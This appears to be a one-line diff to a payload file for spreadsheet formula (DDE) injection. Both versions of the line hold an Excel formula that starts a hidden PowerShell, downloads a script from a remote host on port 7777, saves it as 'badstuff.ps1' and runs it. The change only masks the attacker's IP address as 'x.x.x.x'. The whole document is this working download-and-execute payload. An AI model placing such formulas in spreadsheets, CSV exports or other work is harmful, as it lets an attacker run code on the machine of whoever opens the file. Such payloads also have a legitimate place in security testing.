@@ -1,1 +1,1 @@
-=cmd|' /c c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -noexit -windowstyle hidden -c invoke-webrequest -uri 214.15.102.102:7777/Desktop/SET.ps1 -Usebasicparsing -outfile $env:HOMEPATH\Desktop\badstuff.ps1; ~\Desktop\badstuff.ps1 '!A0
+=cmd|' /c c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -noexit -windowstyle hidden -c invoke-webrequest -uri x.x.x.x:7777/Desktop/SET.ps1 -Usebasicparsing -outfile $env:HOMEPATH\Desktop\badstuff.ps1; ~\Desktop\badstuff.ps1 '!A0
